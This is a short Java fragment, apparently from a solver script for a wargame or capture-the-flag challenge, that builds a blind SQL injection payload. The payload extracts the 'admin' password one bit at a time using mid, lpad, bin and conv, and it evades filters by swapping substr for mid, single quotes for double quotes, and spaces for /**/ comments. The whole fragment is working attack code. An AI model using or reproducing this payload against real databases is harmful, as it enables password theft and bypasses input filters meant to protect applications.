...
String content;
	...
	public void run(){
		...
		try{
			final int bin_len = 8;
			final String fntans = String.format( "0||(!strcmp(id,'admin')&&strcmp(substr(pw,%%d,1),'')<>0&& !strcmp(substr(lpad(bin(conv(hex(substr(pw,%%d,1)),16,10)),%d,'0'),%%d,1),'1'))".replaceAll("substr","mid").replaceAll("'","\"").replaceAll(" ","/**/"),bin_len);
